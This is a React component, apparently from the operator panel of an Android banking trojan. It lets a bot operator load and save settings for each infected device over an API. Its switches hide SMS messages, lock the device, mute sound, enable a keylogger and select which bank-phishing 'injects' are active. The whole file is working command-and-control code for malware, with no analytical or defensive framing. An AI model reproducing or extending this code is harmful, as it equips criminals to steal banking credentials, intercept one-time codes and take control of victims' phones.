import React from 'react';
import SettingsContext from '../../Settings';
import $ from 'jquery';
import { isNullOrUndefined } from 'util';
import { try_eval } from '../../serviceF';
import OnOffSwitcher from './OnOffSwitcher';
import InjectListNamer from './InjectListNamer';

class BotSettingsModal extends React.Component {
    constructor(props)
    {
        super(props);
        this.state = {
            myObjJS: null,
            hideSMS: null,
            lockDevice: null,
            offSound: null,
            keylogger: null,
            activeInjection: null,
            banks: null,
            BotID: SettingsContext.CurrentSetBot,
        };
    }

    componentWillReceiveProps() {
        this.onLoadJson();
    }

    onLoadJson () {
        if(SettingsContext.CurrentSetBot.length < 1) {
            return;
        }
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.restApiUrl,
            data: {
                'params': new Buffer('{"request":"getBotSettings","idbot":"' + SettingsContext.CurrentSetBot + '"}').toString('base64')
            }
        });

        request.done(function(msg) {
			try {
				let result = JSON.parse(msg);
				if(!isNullOrUndefined(result.error))
				{
					SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
				}
				else
				{
					this.setState({
						myObjJS: result,
						hideSMS: result.hideSMS,
						lockDevice: result.lockDevice,
						offSound: result.offSound,
						keylogger: result.keylogger,
						activeInjection: result.activeInjection,
						banks: result.banks,
						BotID: SettingsContext.CurrentSetBot
					});
				}
			
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'Error bot settings. Look console for more details.');
                console.log('Error - ' + ErrMgs);
            }
        }.bind(this));
    }

    ChangeSettings(newComment) {
        this.props.BotListForceUpdate();
    }

    HideThisModal() {
        try_eval('$("#BotSettingsModal").modal("hide");');
    }

    componentDidUpdate() {
        try_eval('UpdateToolTips();');
    }

    componentDidMount() {
        try_eval('UpdateToolTips();');
    }

    callbackBtn(Value, BtnParam) {
        if(BtnParam == "hideSMS"){
            this.state.hideSMS = Value;
        }
        else if(BtnParam == "lockDevice"){
            this.state.lockDevice = Value;
        }
        else if(BtnParam == "offSound"){
            this.state.offSound = Value;
        }
        else if(BtnParam == "keylogger"){
            this.state.keylogger = Value;
        }
        else if(BtnParam == "activeInjection"){
            this.state.activeInjection = Value;
        }
        this.SaveSettings();
    }

    SaveSettings() {
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.restApiUrl,
            data: {//{"request":"editBotSettings","idbot":"123123","hideSMS":"1","lockDevice":"1","offSound":"1","keylogger":"1","activeInjection":":inj1:inj2"}
                'params': new Buffer(
                    '{"' + 
                    'request":"editBotSettings",' + 
                    '"idbot":"' + SettingsContext.CurrentSetBot + '",' + 
                    '"hideSMS":"' + this.state.hideSMS + '",' + 
                    '"lockDevice":"' + this.state.lockDevice + '",' + 
                    '"offSound":"' + this.state.offSound + '",' + 
                    '"keylogger":"' + this.state.keylogger + '",' + 
                    '"activeInjection":"' + this.state.activeInjection + '"' +
                    '}').toString('base64')
            }
        });

        request.done(function(msg) {
			try {
				let result = JSON.parse(msg);
				if(!isNullOrUndefined(result.error))
				{
					SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
				}
				else
				{
					SettingsContext.ShowToast('success', 'Settings saved complete!');
					this.onLoadJson();
				}
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'Error save bot settings. Look console for more details.');
                console.log('Error - ' + ErrMgs);
            }
        }.bind(this));
    }

    render() {
        return (
          //<!-- Modal -->
            <div class="modal fade" id="BotSettingsModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
                <div class="modal-dialog modal-dialog-centered" role="document">
                    <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="exampleModalLongTitle"><b>{'Settings Bot - '}</b><i>{SettingsContext.CurrentSetBot}</i></h5>
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                        </button>
                    </div>
                    <div class="modal-body">
                        <h4>Bot settings</h4>
                        <nav aria-label="breadcrumb">
                            <ol class="breadcrumb">
                                <li class="liwidth100" aria-current="page">
                                Hide SMS <OnOffSwitcher callback={this.callbackBtn.bind(this)} name={"hideSMS"} status={this.state.hideSMS} />
                                </li>
                            </ol>
                        </nav>
                        <nav aria-label="breadcrumb">
                            <ol class="breadcrumb">
                                <li class="liwidth100" aria-current="page">
                                Lock device <OnOffSwitcher callback={this.callbackBtn.bind(this)} name={"lockDevice"} status={this.state.lockDevice} />
                                </li>
                            </ol>
                        </nav>
                        <nav aria-label="breadcrumb">
                            <ol class="breadcrumb">
                                <li class="liwidth100" aria-current="page">
                                Off sound <OnOffSwitcher callback={this.callbackBtn.bind(this)} name={"offSound"} status={this.state.offSound} />
                                </li>
                            </ol>
                        </nav>
                        <nav aria-label="breadcrumb">
                            <ol class="breadcrumb">
                                <li class="liwidth100" aria-current="page">
                                Enable keylogger <OnOffSwitcher callback={this.callbackBtn.bind(this)} name={"keylogger"} status={this.state.keylogger} />
                                </li>
                            </ol>
                        </nav>  
                        <hr />
                        <h4>Active injects list</h4>
                        <InjectListNamer callback={this.callbackBtn.bind(this)} name={"activeInjection"} active={this.state.activeInjection} status={this.state.banks} />
                    </div>
                    </div>
                </div>
            </div>
      );
    }
}

export default BotSettingsModal;